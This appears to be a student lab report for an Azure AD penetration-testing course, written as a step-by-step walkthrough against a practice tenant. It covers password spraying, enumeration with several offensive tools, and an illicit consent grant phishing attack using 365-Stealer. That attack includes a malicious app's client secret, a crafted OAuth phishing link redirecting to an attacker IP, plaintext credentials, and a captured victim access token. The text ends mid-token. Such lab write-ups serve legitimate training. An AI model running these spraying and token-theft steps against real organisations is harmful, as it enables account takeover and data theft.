# Azure AD Pentest - Lab Report

- [Azure AD Pentest - Lab Report](#azure-ad-pentest---lab-report)
  - [Objective 1: Basic Recon](#objective-1-basic-recon)
    - [Is the organization using Azure AD?](#is-the-organization-using-azure-ad)
    - [ID of Tenant](#id-of-tenant)
    - [Validate email IDs](#validate-email-ids)
    - [Azure Services used by the organization](#azure-services-used-by-the-organization)
  - [Objective 2: Initial Access](#objective-2-initial-access)
    - [Questions](#questions)
    - [Brute force](#brute-force)
    - [Enumerate Users / Groups / Devices / Directory Roles / Enterprise Applications on Azure Portal](#enumerate-users--groups--devices--directory-roles--enterprise-applications-on-azure-portal)
  - [Objective 3: Authenticated Enumerations using AzureAD Module](#objective-3-authenticated-enumerations-using-azuread-module)
    - [Users](#users)
    - [Groups](#groups)
    - [Devices](#devices)
    - [Directory Role Global Administrator](#directory-role-global-administrator)
    - [All custom directory roles (Azure Preview)](#all-custom-directory-roles-azure-preview)
    - [Enterprise Applications](#enterprise-applications)
  - [Objective 4: Authenticated Enumeration using Az PowerShell](#objective-4-authenticated-enumeration-using-az-powershell)
    - [All resources visible to the user](#all-resources-visible-to-the-user)
    - [All Azure roles assigned to the user](#all-azure-roles-assigned-to-the-user)
    - [Virtual Machines](#virtual-machines)
    - [App Services](#app-services)
    - [Function Apps](#function-apps)
    - [Storage Accounts](#storage-accounts)
    - [Key Vaults](#key-vaults)
  - [Objective 5: Authenticated Enumeration using Azure CLI](#objective-5-authenticated-enumeration-using-azure-cli)
    - [Virtual Machines](#virtual-machines-1)
    - [App Services](#app-services-1)
    - [Function Apps](#function-apps-1)
    - [Storage Accounts](#storage-accounts-1)
    - [Key Vaults](#key-vaults-1)
  - [Objective 6: Authenticated Enumeration - ROADTool](#objective-6-authenticated-enumeration---roadtool)
  - [Objective 7: Authenticated Enumeration - StormSpotter](#objective-7-authenticated-enumeration---stormspotter)
  - [Objective 8: Authenticated Enumeration - BloodHound](#objective-8-authenticated-enumeration---bloodhound)
  - [Objective 9: Authenticated Enumeration and Initial Access](#objective-9-authenticated-enumeration-and-initial-access)
    - [Setup Malicious Azure App](#setup-malicious-azure-app)
    - [Setup 365-Stealer](#setup-365-stealer)
    - [Get & Send the phishing link](#get--send-the-phishing-link)
    - [Getting the access tokens of the victim](#getting-the-access-tokens-of-the-victim)
    - [Get admin consent](#get-admin-consent)
    - [Weaponized Word file to reverse shell](#weaponized-word-file-to-reverse-shell)
  - [Objective 10: App Service Abuse - Insecured File Upload](#objective-10-app-service-abuse---insecured-file-upload)
    - [Abuse the file upload vulnerability](#abuse-the-file-upload-vulnerability)

---

## Objective 1: Basic Recon

**Questions**

Gather the following information about the defcorphq organization:

- Is the organization using Azure AD? 
- ID of Tenant  
- Validate email IDs  
- Azure Services used by the organization

<br/>

**Answers**

### Is the organization using Azure AD?

To verify if the organization is using Azure AD, we can try to see if an Azure Tenant related to the company exists using the keyword `defcorphq`:

```
https://login.microsoftonline.com/getuserrealm.srf?login=root@defcorphq.onmicrosoft.com&xml=1
```

![picture 8](images/6f16946dc9aa1b7d764b965f76b96c8d40e79d972d2a4abd1151025be406cfe0.png)  

This confirms that the organization is in fact using Azure AD.

<br/>

We can also use AADInternals tool to enumerate:

```
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
Get-AADIntLoginInformation -UserName root@defcorphq.onmicrosoft.com
```

![picture 10](images/364e00f7c08cd9f835709b5c36ff4a00a6575fba38eeab49c61353f1d3478b67.png)  


<br/>

### ID of Tenant

To obtain the ID of the Tenant:

```
https://login.microsoftonline.com/defcorphq.onmicrosoft.com/.well-known/openid-configuration
```

![picture 9](images/ff229051a258e8547450a1e68c96ada916da30a271f3fbace94506dced24788f.png)  

The tenant ID is `2d50cb29-5f7b-48a4-87ce-fe75a941adb6`

<br/>

We can also use AADInternals tool:

```
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
```

![picture 11](images/22422075411b72570d3d03897981bee591dd9916ed6e3a3a4612d9881e71dd94.png)  


<br/>

### Validate email IDs

To enumerate valid email IDs, first we need a list of emails. For example:

![picture 12](images/00810d667085c8996d5f61c16adfa103e7da627bfdf5ff1e193e3b3153856dd0.png)  

Then we can use **o365creeper** to check if they are valid:

```
C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o C:\AzAD\Tools\validemails.txt
```

![picture 13](images/452592e87c17ec2edd6a4e5d9ad3f0473305a41a54341798ba8470b19b735a4b.png)  

<br/>

### Azure Services used by the organization

To enumerate Azure Services used by the organization, we can use **MicroBurst**:

```
Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1 -Verbose
Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

![picture 15](images/cd7fe38ac88b9e8039379188cd898195a3d8c6740dca16d0f559e179a74fac1f.png)  

- Email (defcorphq.mail.protection.outlook.com)
- Microsoft Hosted Domain (defcorphq.onmicrosoft.com)
- SharePoint (defcorphq.sharepoint.com / defcorphq-my.sharepoint.com)

<br/>

---

## Objective 2: Initial Access

### Questions

- Brute-force one of the users that we enumerated from the defcorphq tenant.
- Enumerate the following for the defcorphq tenant using Azure Portal: 
  - Users
  - Groups
  - Devices
  - Directory Roles
  - Enterprise Applications

<br/>

### Brute force

With a valid email list obtained in Objective 1, we can use `MSOLSpray` to perform a password spray:

```
. C:\AzAD\Tools\MSOLSpray\MSOLSPray.ps1

Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password SuperVeryEasytoGuessPassword@1234 -Verbose
```

![picture 16](images/b61c3977af8c1c6babc4a0a82d94f05ab9f6a99a518a481c6e97fb03c039b905.png)  

As shown, we can access the Azure with the following credential:

- `test@defcorphq.onmicrosoft.com` / `SuperVeryEasytoGuessPassword@1234`

<br/>

### Enumerate Users / Groups / Devices / Directory Roles / Enterprise Applications on Azure Portal

First login with the found credentials:

- https://portal.azure.com

![picture 17](images/53636cf52d52e824c4cb86337aa5efee320ad88168dd1f651bfc14e9ead31da3.png)  

<br/>

To view users:

![picture 18](images/c963b6a64f7363b679249ce7075c415b9f0b59707eff3015ba1ad59983765175.png)  

![picture 19](images/b23325d8901224a8eeeff6def092453157a6d3a53915247cced5408a4e6a9471.png)  

<br/>

To view groups:

![picture 20](images/1ce3dbb45679d942cd2717ef9751676f6b94c004cce2bf565ad9e0494d221e16.png)  

![picture 21](images/2c4ab38e6fdcace6bbbbf39824b4472c26a35060b4a7d9f30e627e01a207997c.png)  

<br/>

To view Devices:

![picture 22](images/fd52410d1e2136936f1d332afbb3f028cd4de8b25f5bd6c4be240bab65d45c29.png)  

![picture 23](images/5e9272dfd466a43ccfc3bcf3dab8a73cbc6d2e292fcda0da70f951a9ba4fdd1c.png)  

<br/>

To view directory roles:

![picture 24](images/05f26e8788cff4ff437a8069779579ead4ad3422369620ba34c3c97df60ece52.png)  

![picture 25](images/07dcc7c7fd98f4aa14dd4bb453bc2958bae936370fe87f89ebf79109e502c832.png)  

<br/>

To view enterprise applications:

![picture 26](images/0fcca73fb76dd72c5d9ca2a18c78b3d859265571653a843609675928cfa20af9.png)  

![picture 27](images/a4c3375179ace4602b19318467f1a59065be3e7e3d8a139d49be31062c1db12f.png)  

<br/>

---

## Objective 3: Authenticated Enumerations using AzureAD Module

Enumerate the following for the defcorphq tenant using AzureAD PowerShell module

- Users
- Groups
- Devices
- Directory Role Global Administrator
- All custom directory roles (Azure Preview)
- Enterprise Applications

<br/>

### Users

First import AzureAD module:

```
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1; $passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force ; $creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com", $passwd) ; Connect-AzureAD -Credential $creds
```

![picture 67](images/d4a1b4ec0b3b841948169afc31abe62109a225e81f15dfd577a4c4121c92bf4b.png)  


<br/>

To enumerate users:

```
Get-AzureADUser -All $true
```

![picture 68](images/c706a7fcd2bb2e0971416daf0124910d21201015d55bc8df66dfc0e1fb9f5521.png)  

<br/>

### Groups

To enuemrate Groups:

```
Get-AzureADGroup -All $true
```

![picture 69](images/a1e4f3079118d415aa0fe73d5fab159f3c5b89af31b507e24fc2dec06cb9dd3a.png)  

<br/>

### Devices

To enumerate Devices:

```
Get-AzureADDevice -All $true
```

![picture 70](images/fccefa100e940fd48287b1a0d08e9e3a9c3af8e846316cc87205b7880056a856.png)  

<br/>

### Directory Role Global Administrator

To enumerate users with Global Administrator role:

```
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
```

![picture 71](images/30ebed333edde5fa2be3f13c1c67c5d722beb82c8d6b7d0ddf9086e75e7fa880.png)  

<br/>

### All custom directory roles (Azure Preview)

To list custom roles, **AzureADPreview** module can be used:

```
Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1; $passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd); Connect-AzureAD -Credential $creds

Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
```

![picture 74](images/e8d53ff46e004736d6fe77cd764b8697832ef94424d282aaf93aa14faf93325a.png)  

<br/>

### Enterprise Applications

To enuemrate enterprise applications (Note this is **Service Principal but not App!**):

```
Get-AzureADServicePrincipal -All $true
```

![picture 76](images/3477d29709b4d739c9e94bb81c272547d2cdeea2736c2cd56600960539cd269e.png)  


<br/>

---

## Objective 4: Authenticated Enumeration using Az PowerShell

**Question**

Enumerate the following for the defcorphq tenant using Az PowerShell module using the credentials of `test@defcorphq.onmicrosoft.com` user:
- All resources visible to the user 
- All Azure roles assigned to the user 
- Virtual Machines 
- App Services 
- Function Apps 
- Storage Accounts
- Key Vaults

<br/>

**Answer**

### All resources visible to the user 

First authenticate with Azure:

```
$passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com", $passwd); Connect-AzAccount -Credential $creds
```

![picture 91](images/d20978857baf52cc65f27e34024c04357326673a467d171ce1354a47bd03bf80.png)  

<br/>

To enumerate all resources visible to the current user:

```
Get-AzResource | Select Name, ResourceGroupName, ResourceType
```

![picture 92](images/d4f92f4f66f30de1a78b2df24f6650bd2cd0f07c25c330a9008409e555bda8a9.png)  

<br/>

### All Azure roles assigned to the user

To enuemrate the roles assigned to the current user:

```
Get-AzRoleAssignment -SignInName test@defcorphq.onmicrosoft.com | ft DisplayName, RoleDefinitionName, ObjectType, CanDelegate
```

![picture 93](images/4e27b44f0ca173c21594f303c1630bf9312a7e5e24f17422ef2378c4b935c3a3.png)  

<br/>

### Virtual Machines

To enuemrate VM where the current user has at least READ access:

```
Get-AzVM | fl *
```

![picture 94](images/fb92df6043f476403cc91f46b609b2b513fa499682bbcd18330f50d76f4cda8b.png)  

<br/>

### App Services 

Note that **App Services** refers to **web hosting service**.

```
Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"} | ft Name, HostNames, DefaultHostName, Kind, Type
```

![picture 95](images/a032f24f23146ae38053ed78fd059b6578e339d75b4a842519dc82381323ba04.png)  

<br/>

### Function Apps

To enuemerate Function Apps:

```
Get-AzFunctionApp | ft Name, HostNames, DefaultHostName, Kind, Type
```

![picture 96](images/813ca7efe92ff3c6e8d73dcd5627aaf0f0b8b1358e6bf6e87430527caa12730b.png)  

<br/>

### Storage Accounts

To enuemrate storage accounts:

```
Get-AzStorageAccount | fl *
```

![picture 97](images/ed6c5ac314b1293ed0be2d49f96dc16e837a56f62078e0984fa77f3ea25af54e.png)  

<br/>

### Key Vaults

To enumerate key vaults:

```
Get-AzKeyVault | fl *
```

![picture 98](images/ee56a267f1d9ac65e5eb436590ca1abdc46a9b5ca060bcf9120115dc9ff55496.png)  

<br/>

---

## Objective 5: Authenticated Enumeration using Azure CLI

**Questions**

Enumerate the following for the defcorphq tenant using az cli using the credentials of `test@defcorphq.onmicrosoft.com` user:

- Virtual Machines
- App Services
- Function Apps
- Storage Accounts
- Key Vaults

<br/>

**Answers**

### Virtual Machines

First authenticate with the compromised credential:

```
az login -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234 --allow-no-subscriptions
```

![picture 128](images/bd15f073e572e652c544392f1955c6ed12bd6c589d9f09317749f61a6e9e74f6.png)  


<br/>

To list all VMs:

```
az vm list --query "[].name"
```

![picture 129](images/668a3573ef11581744c251df34715421c3198beeb098f33867c54043cbe6f19b.png)  

<br/>

### App Services

To list app services (webapp):

```
az webapp list --query "[].hostNames"
```

![picture 130](images/7aecd518602bf9db22d872efb2560f0e6aec448d44beed8dad513b291895648f.png)  

<br/>

### Function Apps

```
az functionapp list --query "[].hostNames"
```

![picture 131](images/9532c2f068a895194a3faa3a59209d96ef8ab172180203e15c6ee658083c7f36.png)  

<br/>

### Storage Accounts

```
az storage account list
```

### Key Vaults

```
az key vault list
```

<br/>

---

## Objective 6: Authenticated Enumeration - ROADTool

**Questions**

Enumerate the following for the defcorphq tenant using ROADTools with the credentials of test@defcorphq.onmicrosoft.com user:

1. Check if the 'Operations' Group is allowed to use Finance Management System app
2. Permissions that AdminAppSimulation has for Mark D Walden

<br/>

**Answer**

First use ROADTools to authenticate with Azure AD:

```
cd C:\AzAD\Tools\ROADTools; pipenv shell; 

roadrecon auth -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234
```

![picture 1](images/f75a3aa8e37f5a75a2fd1597424ea00c521d503fcd3bcf05a7842ec882fba598.png)  

<br/>

Then gather information:

```
roadrecon gather
```

![picture 2](images/e5f413d447f190d88a5bc42a70319f5130342b16fbe7752f407c4df5365d6b64.png)  


<br/>

Run ROADTools GUI:

```
roadrecon gui
```

![picture 3](images/3a7a1554c7d98fa68e150b720a2913a91f64993bbfdd3eb62b60a29196fd44c7.png)  


<br/>

![picture 4](images/8ca52a474e95b7d883f4c46a11696ecbe09866ada5cc698caf9b3fcaa2ce3101.png)  

<br/>

Navigate to `Applications roles` and filter out `Operations`, it is found that `Operations` has access to the application `Finance Mangement System`:

![picture 5](images/7396268e7b90e9487f9eb76696b18b7f64d7959b5343e1c248f04ddda0381a8a.png)  

<br/>

To check the permissions that AdminAppSimulation has for Mark D Walden, navigate to `OAuth2 Permissions` and filter out `AdminAppSimulation`:

![picture 6](images/ae374927b39bcbf42cd1485f5a3c7cbb86f45ab70d8608f9ff05f8720fe83921.png)  

<br/>

---

## Objective 7: Authenticated Enumeration - StormSpotter

**Question**

Enumerate the following for the defcorphq tenant using StormSpotter with the credentials of test@defcorphq.onmicrosoft.com user:
- Show All RBAC Relationships

<br/>

**Answer**

First start the backend service:

```
cd C:\AzAD\Tools\stormspotter\backend\; pipenv shell 

python ssbackend.pyz
```

![picture 7](images/54f0d83e8c68b6615e25756a242d2ef3d09daf7057c98e7a669f1319f706c1f6.png)  

<br/>

In a new shell, start the frontend webserver:

```
cd C:\AzAD\Tools\stormspotter\frontend\dist\spa\; quasar.cmd serve -p 9091 --history
```

![picture 8](images/086f7377c5b766afd7a5859e200fdd8df3e32389f61b0cf3de90defe7b1deb8a.png)  

<br/>

Use Stormcollector to collect the data:

```
cd C:\AzAD\Tools\stormspotter\stormcollector\; pipenv shell

az login -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234; python C:\AzAD\Tools\stormspotter\stormcollector\sscollector.pyz cli
```

![picture 9](images/073adf74cfcef0e01a29ecc45137746d36527c94303953dfb88ac9a231506e2b.png)  

<br/>

Then browse http://localhost:9091 and user the credential `neo4j` / `BloodHound`:

![picture 10](images/b8a148c0b75005449063542630037eac863ea7eeef877498b6d9f57499a5cd05.png)  

<br/>

Upload the collected data:

![picture 11](images/8a312e0f108657f2a4ec0702987ce2da86c94c8e927849cd4c5997615b86a80d.png)  

<br/>

Use the query `Show all RBAC Relationships`:

![picture 12](images/76b6a65f037cc988c36131c412a512dcf846df3c7fb5a745624ec524601de9e2.png)  

<br/>

---

## Objective 8: Authenticated Enumeration - BloodHound

**Question**

Enumerate the following for the defcorphq tenant using BloodHound with the credentials of test@defcorphq.onmicrosoft.com user:

- All users with the Global Administrator role
- All paths to an Azure Key vault

<br/>

**Answer**

First run the collector to gather data:

```
$passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com", $passwd)

Connect-AzAccount -Credential $creds
Connect-AzureAD -Credential $creds

. C:\AzAD\Tools\AzureHound\AzureHound.ps1
Invoke-AzureHound -Verbose
```

![picture 13](images/f977dddf79bf20670e0fa4f116416850407bb0956a9ffc0aa7bce25d5ed3390f.png)  

<br/>

Then launch BloodHound and use the credential `neo4j` / `BloodHound` to login:

![picture 14](images/bee82fe7bd2b878ff78e0de0f23371a93b505948255d8e36ca49158ebba35b55.png)  

<br/>

Upload the collected data:

![picture 15](images/3f6fe2f389916b8b8db697b1031be9641893f88bb7fddb18aa61231511a0633a.png)  

<br/>

To get all users with the Global Administrator role, use the following query at the bottom field **Raw Query**:

```
MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p
```

![picture 16](images/a3e03621f3693d5394160e99bb6396dcfaa7327e95fc6f35aeb2240d07f7e235.png)  

![picture 17](images/f473ad8848a22c7d1f1c073f3bfd749f7a14630a093746b3a81a3177ef0d2c9c.png)  

![picture 18](images/66412f46ec791a6a14d38035862cb7204c25d8c38d7ea668dcf9e4bf5ad348b9.png)  

<br/>

Users with the Global Administrator role:

- ADMIN@DEFCORPHQ.ONMICROSOFT.COM
- MONIKA_ALTEREDSECURITY.COM#EXT#_MONIKAALTEREDSECURITY.FGYWB#EXT#@DEFCORPHQ.ONMICROSOFT.COM

<br/>

To get all paths to an Azure key vault:

```
MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p
```

<br/>

---

## Objective 9: Authenticated Enumeration and Initial Access

**Question**

Compromise an application administrator and their workstation in defcorphq tenant using the **Illicit Consent Grant attack**.

**Answser**

### Setup Malicious Azure App

First use the attacker's infrastructure to register an application.

- student190@defcorpextcontractors.onmicrosoft.com

Go to **AAD > App Registration > New Registration**:

![picture 1](images/347af324f5dd65f16d4e56ffbbe160f2ca637e5d7b802440ab2b07a4d45e13b7.png)  

- **Name**: student190-app
- **Supported account types:**  Accounts in any organizational directory (Any Azure AD directory - Multitenant)
- **Redirect URI:** (Web) https://172.16.152.190/login/authorized

<br/>

Then you will be redirected to the Overview page. Note the Application ID:

![picture 4](images/d978d43b6bb3ce114f7b78ab8e52034dee88d7a7a5cf1d7dad1fa95e7bc030c1.png)  

- **Application ID:**  `2ec2f07e-5a83-4110-8859-d4d5a14bad2e`

<br/>

Then go to **Certificates & secrets > New client secret**:

![picture 2](images/f506ceeda558a46cf02eb2802ea33f29dc6260d8720144f9f1c31bd1eadf7581.png)  

- **Description:**  student190-secret

Save the secret somewhere:

![picture 3](images/08cfd6fe528bf850435c2f3aea8e1b600dc6199a7ac4b7c2a4b88f467a43c36c.png)  

- **Secret ID:**  `72cf98cf-0a9e-4758-adc2-f51144f45eed`
- **Secret Value:**  `_-l5-M386zc-gRo_4_9czdyJ_NVXic1DrO`

<br/>

Then go to **API permissions** and add the following Delegated permissions:

- `User.Read`
- `User.ReadBasic.All`

![picture 5](images/15d61dd30de4d798238012340bab5feb361b91984dfb0d91623f22c0f41bd526.png)  

<br/>

Then use the **AzureADPreview** module to see if the users (compromised accounts) are allowed to consent to apps. If true, we will get a response of `ManagePermissionGrantsForSelf.microsoft-user-default-legacy`:

```
Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1; $passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd); Connect-AzureAD -Credential $creds; (Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```

![picture 6](images/cb3b1266c731ed2f1ba6b4656285fe5a6dae9ca6f69287643ca5e50ca3582ba1.png)  

<br/>

### Setup 365-Stealer

First run (as admin) xampp control panel and start Apache.

![picture 7](images/476ddfd88a8ee640d7e26a2298f0814c12145580fd37b110ab4fcaea42143800.png)  

<br/>

Copy the 365-Stealer directory from `C:\AzAD\Tools` to `C:\xampp\htdocs`. Edit `365-stealer.py` in `C:\xampp\htdocs\365-Stealer` and change:

| **Parameter** | **Value** |
| --- | --- |
| `CLIENTID` | `2ec2f07e-5a83-4110-8859-d4d5a14bad2e` |
| `REDIRECTURL` | `https://172.16.152.190/login/authorized` |
| `CLIENTSECRET` |  `_-l5-M386zc-gRo_4_9czdyJ_NVXic1DrO` |

![picture 8](images/50c20caec60190dd7d8b8f87d1344d757b54d1be5255344f293aa03f71787e15.png)  

<br/>

Then start 365-stealer:

```
cd C:\xampp\htdocs\365-Stealer; &"C:\Program Files\Python38\python.exe" C:\xampp\htdocs\365-Stealer\365-Stealer.py --run-app
```

![picture 9](images/607b3732bdd0f0dca80aaa9b88aebf152f920763c4897f8f2909356c9c134e7b.png)  

<br/>

### Get & Send the phishing link

Go to https://localhost and click on `Read More`. Then copy the URL:

![picture 10](images/f21538a8694bcda9a6137f05b18deefe6b21525d563bb2b0c78f765259afb2f6.png)  

- `https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=2ec2f07e-5a83-4110-8859-d4d5a14bad2e&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F172.16.152.190%2Flogin%2Fauthorized&response_mode=query&sso_reload=true`

<br/>

Then we have to think of how to get the victim to click on the link.

One of the ways is to use `MicroBurst` to find an application that allows us to contact users in the target organization. (Note: It takes time to do this ...)

```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1; Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

- In this case `defcorphqcareer.azurewebsites.net` is found.

![picture 11](images/e46ec6273a6fccffac9d229bfd51696a349729440cab3d1adfd17e1b71c6564c.png)  

https://defcorphqcareer.azurewebsites.net/help.php allows us to send a message and link:

![picture 12](images/3c59cf398231fa5fdfdcba7da15ab27e3835d9e26b507b5d73da0c2b2440be31.png)  

<br/>

Use the phishing link in the form:

![picture 13](images/bcf6d51d56ae18284e2fabd3f36ea195cfa4b6d7bb476e822e0693a7687a3603.png)  

<br/>

### Getting the access tokens of the victim

After a while, the victim `ErikMKeller@defcorphq.onmicrosoft.com` checks the phishing link:

![picture 14](images/f419825716107cade8799610fa39465de5f1e10f9cfe113953928c95cbf094b7.png)  

Browse http://localhost:82/365-Stealer/yourVictims/?dir=ErikMKeller%40defcorphq.onmicrosoft.com:

![picture 15](images/c876a29c2db1d27b810ba6cc4f8f92606bccf2979ab4fb666b5b55fd3e2993d3.png)  

The access token:

```
eyJ0eXAiOiJKV1QiLCJub25jZSI6Im1hNlBrQkZIblNSQkFfRmZlTGJ1TFF6VUVkWGVzeGpIWUpibUozSlpwN1UiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYxOTg3MjI2NiwibmJmIjoxNjE5ODcyMjY2LCJleHAiOjE2MTk4NzYxNjYsImFjY3QiOjAsImFjciI6IjEiLCJhY3JzIjpbInVybjp1c2VyOnJlZ2lzdGVyc2VjdXJpdHlpbmZvIiwidXJuOm1pY3Jvc29mdDpyZXExIiwidXJuOm1pY3Jvc29mdDpyZXEyIiwidXJuOm1pY3Jvc29mdDpyZXEzIiwiYzEiLCJjMiIsImMzIiwiYzQiLCJjNSIsImM2IiwiYzciLCJjOCIsImM5IiwiYzEwIiwiYzExIiwiYzEyIiwiYzEzIiwiYzE0IiwiYzE1IiwiYzE2IiwiYzE3IiwiYzE4IiwiYzE5IiwiYzIwIiwiYzIxIiwiYzIyIiwiYzIzIiwiYzI0IiwiYzI1Il0sImFpbyI6IkFTUUEyLzhUQUFBQWNDR0hIYWt5dVZlVHhnUDNnRklXdzZhM3MydVdUUHlGSUpVZjRNdVg0TVk9IiwiYW1yIjpbInB3ZCJdLCJhcHBfZGlzcGxheW5hbWUiOiJzdHVkZW50MTkwLWFwcCIsImFwcGlkIjoiMmVjMmYwN2UtNWE4My00MTEwLTg4NTktZDRkNWExNGJhZDJlIiwiYXBwaWRhY3IiOiIxIiwiaWR0eXAiOiJ1c2VyIiwiaXBhZGRyIjoiNTEuMjEwLjEuMjM5IiwibmFtZSI6IkVyaWsgTS4gS2VsbGVyIiwib2lkIjoiNGQxZDk5M2ItNmY1MC00ZDViLWFkODgtYWM0YzI2MjQzYTY2IiwicGxhdGYiOiIzIiwicHVpZCI6IjEwMDMyMDAxMjBENkZGODYiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dG43d3dpNkRXaEJCaUZuVTFhRkxyUzV3QUs0LiIsInNjcCI6IlVzZXIuUmVhZCBVc2VyLlJlYWRCYXNpYy5BbGwiLCJzaWduaW5fc3RhdGUiOlsiaW5rbm93bm50d2siXSwic3ViIjoiUk81UTFUMXh0ejFyYlZNMEFuNG5hcjZIWXd3VUV3eEM5QnlIdmJfNnJ0MCIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJBUyIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInVuaXF1ZV9uYW1lIjoiRXJpa01LZWxsZXJAZGVmY29ycGhxLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6IkVyaWtNS2VsbGVyQGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJPX0ctWDZkOEVVaVFCOHh0R2dwVUFnIiwidmVyIjoiMS4wIiwid2lkcyI6WyJiNzlmYmY0ZC0zZWY5LTQ2ODktODE0My03NmIxOTRlODU1MDkiXSwieG1zX3RjZHQiOjE2MTUzNzU2Mjl9.JExDfzGEVDBilHfR9hVa1_2THrBk28yRj68uXEhlRpUtixCgO1VFR9h_0A_IlV0xfYkStkk4BzLuJbNkqrePfxhlYHDv5N9QsA9xdpiK5GyKUBUFNTlRnm5fe24CIIR9MPBsOz16RXe2qHf_YKOBw9pDge2MwBLzdJu8J4ZZ_r7L3VIpg3-fPA5yD3PA_3nY3RmXS9yTn_CHCCcezBCTQz1vI7TUc-998xvVDOMcmOqwM4pSfVU7UDC6eTfgvWaAr7q-1ekGWFBhoLB2HJ24ntw-Jf45AGYlcDCs2QXcjK43uK4GXCP9mFuyLA03XpCeTuIS3WOo39tjcRAjYQpY_g 
```

<br/>

Remember our app has the consent to `User.Read` and `User.ReadBasic.All` permissions. Try to enumerate all users (this gives us a list of targets in the target organization).

```
$Token = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6Im1hNlBrQkZIblNSQkFfRmZlTGJ1TFF6VUVkWGVzeGpIWUpibUozSlpwN1UiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYxOTg3MjI2NiwibmJmIjoxNjE5ODcyMjY2LCJleHAiOjE2MTk4NzYxNjYsImFjY3QiOjAsImFjciI6IjEiLCJhY3JzIjpbInVybjp1c2VyOnJlZ2lzdGVyc2VjdXJpdHlpbmZvIiwidXJuOm1pY3Jvc29mdDpyZXExIiwidXJuOm1pY3Jvc29mdDpyZXEyIiwidXJuOm1pY3Jvc29mdDpyZXEzIiwiYzEiLCJjMiIsImMzIiwiYzQiLCJjNSIsImM2IiwiYzciLCJjOCIsImM5IiwiYzEwIiwiYzExIiwiYzEyIiwiYzEzIiwiYzE0IiwiYzE1IiwiYzE2IiwiYzE3IiwiYzE4IiwiYzE5IiwiYzIwIiwiYzIxIiwiYzIyIiwiYzIzIiwiYzI0IiwiYzI1Il0sImFpbyI6IkFTUUEyLzhUQUFBQWNDR0hIYWt5dVZlVHhnUDNnRklXdzZhM3MydVdUUHlGSUpVZjRNdVg0TVk9IiwiYW1yIjpbInB3ZCJdLCJhcHBfZGlzcGxheW5hbWUiOiJzdHVkZW50MTkwLWFwcCIsImFwcGlkIjoiMmVjMmYwN2UtNWE4My00MTEwLTg4NTktZDRkNWExNGJhZDJlIiwiYXBwaWRhY3IiOiIxIiwiaWR0eXAiOiJ1c2VyIiwiaXBhZGRyIjoiNTEuMjEwLjEuMjM5IiwibmFtZSI6IkVyaWsgTS4gS2VsbGVyIiwib2lkIjoiNGQxZDk5M2ItNmY1MC00ZDViLWFkODgtYWM0YzI2MjQzYTY2IiwicGxhdGYiOiIzIiwicHVpZCI6IjEwMDMyMDAxMjBENkZGODYiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTF